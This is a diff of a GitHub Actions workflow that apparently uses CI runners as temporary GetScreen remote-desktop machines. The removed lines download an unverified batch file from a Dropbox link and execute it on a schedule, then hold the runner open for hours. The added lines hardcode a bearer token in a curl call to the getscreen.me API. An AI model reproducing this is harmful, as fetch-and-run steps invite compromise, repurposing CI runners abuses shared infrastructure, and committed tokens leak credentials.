@@ -1,23 +1,16 @@
-name: GetScreen Windows (4H)
+name: Create GetScreen Windows Machine
 
 on:
-  push:
-    branches:
-      - main  # Bu iş akışı yalnızca 'main' dalına yapılan itişlerde çalışır.
-  schedule:
-    - cron: "0 */4 * * *"  # Her 4 saatte bir iş akışını çalıştır
-
+  workflow_dispatch:
+  
 jobs:
-  build:
-    runs-on: windows-latest
-
+  create_machine:
+    runs-on: ubuntu-latest
     steps:
-      - name: Downloading & Setting Up
+      - name: Create GetScreen Windows Machine
         run: |
-         echo "EMAIL_SECRET=buildefcorporation@gmail.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1" -OutFile "down.bat"
-         Start-Process -FilePath "down.bat" -Wait
-
-      - name: Time Counter
-        run: |
-          Start-Process -FilePath "cmd" -ArgumentList "/c", "Start-Sleep -Seconds 14600"
+          curl -X POST \
+            -H "Authorization: Bearer elctXfgXeIFCFqha3MKSBuGXf1W1mFnHhsanlRNSKhN3ojlARaekiI5b1EzDgFwLjx6WoEPWr6jdFajRmZuzwhZKtShDJyPcrdHReirnh3ixbBtGCIsNnaNRKUnDGwh1" \
+            -d "image=windows" \
+            -d "duration=4" \
+            https://getscreen.me/api/v1/machines
